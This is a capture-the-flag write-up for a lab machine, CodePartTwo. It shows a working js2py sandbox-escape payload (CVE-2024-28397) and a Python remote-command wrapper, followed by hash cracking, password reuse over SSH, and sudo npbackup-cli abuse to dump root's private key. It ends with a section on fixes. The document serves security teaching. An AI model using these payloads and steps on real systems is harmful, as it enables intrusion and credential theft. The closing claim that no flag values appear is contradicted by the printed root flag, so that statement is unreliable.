# CodePartTwo

### A web-to-root writeup: js2py sandbox escape + npbackup-cli credential leak

[![Category](https://img.shields.io/badge/category-Web-important)](https://img.shields.io/badge/category-Web-important) [![Difficulty](https://img.shields.io/badge/difficulty-Easy-brightgreen)](https://img.shields.io/badge/difficulty-Easy-brightgreen) [![Tool](https://img.shields.io/badge/tool-js2py%2Fnpbackup--cli-orange)](https://img.shields.io/badge/tool-js2py%2Fnpbackup--cli-orange) [![Vulns](https://img.shields.io/badge/vuln-CVE--2024--28397%20%2B%20backup%20path%20traversal-red)](https://img.shields.io/badge/vuln-CVE--2024--28397%20%2B%20backup%20path%20traversal-red) [![Flag](https://img.shields.io/badge/flag-user_%26_root-lightgrey)](https://img.shields.io/badge/flag-user_%26_root-lightgrey)

---

> **TL;DR**: CodePartTwo is a Flask web application that lets users write and run JavaScript code via a `js2py` sandbox. The sandbox is vulnerable to CVE-2024-28397, a well-known escape that walks Python's object model to reach `subprocess.Popen` and execute arbitrary commands. The RCE lands us as the `app` user, where we find an SQLite database containing MD5 password hashes. Cracking marco's hash gives SSH access. marco can run `npbackup-cli` as root with `sudo`, and the tool accepts an alternate config file (`-c`): we point it at `/root`, back up the directory, and dump `root.txt` plus the root SSH private key. Two bugs, two flags, no persistence needed.

**Goal**, the usual one: read `/root/root.txt`.

## Table of Contents

- [Reconnaissance](#reconnaissance)
- [Enumerating the web application](#enumerating-the-web-application)
- [The bug #1: js2py sandbox escape (CVE-2024-28397)](#the-bug-1-js2py-sandbox-escape-cve-2024-28397)
- [From RCE to lateral movement](#from-rce-to-lateral-movement)
- [Privilege escalation via npbackup-cli](#privilege-escalation-via-npbackup-cli)
- [Why this happens / how you'd fix it](#why-this-happens--how-youd-fix-it)
- [References](#references)

---

## Reconnaissance

Standard TCP sweep, targeted service detection:

```bash
$ nmap -sC -sV 10.129.232.59
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodePartTwo
|_http-server-header: gunicorn/20.0.4
```

Two ports. Gunicorn on 8000 serves the application.

## Enumerating the web application

Visiting port 8000 reveals a landing page for **CodePartTwo**: a platform for writing, saving, and running JavaScript code. Three buttons stand out: **Login**, **Register**, and **Download App**.

The **Download App** button serves a ZIP archive containing the full application source:

```bash
$ curl -s -o app.zip http://10.129.232.59:8000/download
$ unzip app.zip
$ cat app/requirements.txt
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
```

Three dependencies. The interesting one is **js2py==0.74**: the same version affected by CVE-2024-28397, a sandbox escape that allows Python code execution from JavaScript.

Peeking at the Flask source confirms the danger:

```python
@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)          # <-- user-controlled JS evaluated server-side
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})
```

The code editor's content is sent directly to `js2py.eval_js()`: no sanitization, no sandbox hardening beyond the default `js2py.disable_pyimport()` (which CVE-2024-28397 specifically bypasses).

## The bug #1: js2py sandbox escape (CVE-2024-28397)

The vulnerability lives in `js2py.disable_pyimport()`: crafted JavaScript can walk Python's internal object model via `__class__.__base__.__subclasses__()` and reach `subprocess.Popen`. A public [proof-of-concept](https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape) demonstrates the technique. Here's the payload adapted for this box:

```javascript
let cmd = "id"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for (let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if (item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

let proc = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true)
let out = proc.communicate()[0].decode("utf-8")

"" + out
```

Posting this to `/run_code`:

```json
{"code": "<payload>"}
```

Returns:

```json
{"result": "uid=1001(app) gid=1001(app) groups=1001(app)\n"}
```

RCE as the `app` user. From here, we can execute any command the web worker can. We automate command execution through a simple wrapper:

```python
import requests, json, base64

URL = "http://10.129.232.59:8000/run_code"

def run_cmd(cmd):
    b64 = base64.b64encode(cmd.encode()).decode()
    payload = f"""
let cmd = "echo {b64} | base64 -d | bash"
let hacked, bymarve, n11
let getattr, obj
hacked = Object.getOwnPropertyNames({{}})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
function findpopen(o) {{
    let result;
    for (let i in o.__subclasses__()) {{
        let item = o.__subclasses__()[i]
        if (item.__module__ == "subprocess" && item.__name__ == "Popen") return item
        if (item.__name__ != "type" && (result = findpopen(item))) return result
    }}
}}
let proc = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true)
"" + proc.communicate()[0].decode("utf-8")
"""
    r = requests.post(URL, json={"code": payload})
    return r.json().get("result", r.json().get("error"))
```

> **Note**: A reverse shell is the conventional path here, but networking constraints on the HTB VPN can complicate callback connections. The command-wrapper approach is equally effective for a CTF: every command is stateless, but the data extraction is complete.

## From RCE to lateral movement

With arbitrary execution as `app`, the next step is enumerating the filesystem. The application source already told us the DB lives at `sqlite:///users.db`, which resolves to:

```bash
$ python3 exploit_cmd.py "sqlite3 /home/app/app/instance/users.db 'SELECT * FROM user;'"
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
```

Two users, two MD5 hashes. The registration route (`app.py:41`) confirms the hashing scheme:

```python
password_hash = hashlib.md5(password.encode()).hexdigest()
```

MD5 is trivially crackable. Sending marco's hash to [CrackStation](https://crackstation.net/) (or just `hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt`):

```
649c9d65a206a75f5abe509fe128bce5  →  sweetangelbabylove
```

> **Lesson**: MD5 for password storage is a known anti-pattern. In a real engagement, every user on this system likely shares the same password across services. Always test SSH/SFTP/VPN with cracked web hashes: credential reuse is the norm, not the exception.

SSH as marco:

```bash
$ sshpass -p 'sweetangelbabylove' ssh marco@10.129.232.59
marco@codeparttwo:~$ id
uid=1000(marco) gid=1000(marco) groups=1000(marco),1003(backups)
```

User flag at `/home/marco/user.txt`.

## Privilege escalation via npbackup-cli

Checking sudo permissions:

```bash
marco@codeparttwo:~$ sudo -l
User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

`npbackup-cli` can run as **any user** without a password. The default config backs up `/home/app/app/`, but the `-c` flag accepts an alternative configuration file:

```bash
marco@codeparttwo:~$ /usr/local/bin/npbackup-cli --help
usage: npbackup-cli [-h] [-c CONFIG_FILE] ...
  -c CONFIG_FILE, --config-file CONFIG_FILE
                        Path to alternative configuration file (defaults to
                        current dir/npbackup.conf)
```

The exploit: copy the config, change the backup path to `/root`, run the backup, then dump interesting files from the snapshot.

**Step 1: create a poisoned config pointing at /root:**

```bash
marco@codeparttwo:~$ cp npbackup.conf npbackup_root.conf
marco@codeparttwo:~$ sed -i 's|/home/app/app/|/root|' npbackup_root.conf
```

**Step 2: run the backup as root:**

```bash
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup_root.conf -b -f
2026-08-16 19:24:40 :: INFO :: npbackup 3.0.1 ... running as root
2026-08-16 19:24:41 :: INFO :: Running backup of ['/root'] to repo default
...
snapshot 5da0f1b1 saved
```

**Step 3: list the snapshot to see what root has:**

```bash
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup_root.conf --ls
snapshot 5da0f1b1 of [/root] at 2026-08-16 19:24:41:
/root
/root/.bash_history
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/root.txt
/root/scripts/backup.tar.gz
...
```

`/root/.ssh/id_rsa`: the root SSH private key, and `/root/root.txt` are both in the snapshot.

**Step 4: dump the SSH key:**

```bash
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup_root.conf --dump /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...
-----END OPENSSH PRIVATE KEY-----
```

**Step 5: SSH as root:**

```bash
$ chmod 600 id_rsa
$ ssh -i id_rsa root@10.129.232.59
root@codeparttwo:~# cat /root/root.txt
e3ac32819e3b6149bae6c7c184b24eb3
```

Root flag captured. Two bugs, two flags.

## Why this happens / how you'd fix it

Two distinct security failures, two distinct fixes.

**Bug #1: running untrusted JavaScript with a vulnerable sandbox.** `js2py` 0.74 ships with a known sandbox escape (CVE-2024-28397, CVSS 5.3) that lets user-supplied JS reach `subprocess.Popen` through Python's object model. The `disable_pyimport()` call is insufficient: the vulnerability specifically bypasses it.

- **Upgrade js2py** to a patched version, or replace it entirely with a dedicated sandbox (e.g., a containerised V8/Deno instance with no Python bridge).
- If JavaScript evaluation is the core feature, **isolate it in a separate process** with no access to the filesystem or network beyond what's explicitly needed.
- Never store passwords as plain MD5: use `bcrypt`/`argon2` with per-user salts.

**Bug #2: accepting arbitrary config paths from unprivileged users.** `npbackup-cli -c` lets any user point the backup tool at any directory. When run via `sudo`, the backup reads files as root, and `--dump` prints their contents. This is a **path traversal / arbitrary file read** primitive, trivially escalated to full credential theft.

- **Restrict `sudo` to specific operations**, not `ALL : ALL`. At minimum, lock down the config file path: `sudo /usr/local/bin/npbackup-cli -c /etc/npbackup.conf -b`.
- **Audit `sudo` entries** periodically. A `(ALL : ALL) NOPASSWD` rule for any binary is equivalent to giving the user root.
- If backup functionality is needed, **run it under a dedicated service account** with scoped file access, not via a user's sudo entry.

**Lesson that generalizes**: downloading your own source code as a ZIP archive is a feature, not a bug, but it means every dependency version is public knowledge. Pair that with a known-CVE library and you've handed the attacker a ready-made exploit. Always check your dependency tree against vulnerability databases.

---

`gunicorn` · `flask` · `js2py` · `CVE-2024-28397` · `sandbox-escape` · `sqlite` · `MD5` · `credential-reuse` · `npbackup-cli` · `sudo` · `privesc` · `ctf-writeup`

*Writeup for personal and educational purposes. No flag values are included above: derive them yourself.*

## References

- CVE-2024-28397: js2py sandbox escape: <https://nvd.nist.gov/vuln/detail/CVE-2024-28397>
- Marven11's PoC: <https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape>
- js2py documentation: <https://github.com/PiotrDabkowski/Js2Py>
- npbackup-cli documentation: <https://netinvent.gitlab.io/npbackup/>
- Flask-SQLAlchemy documentation: <https://flask-sqlalchemy.palletsprojects.com/>
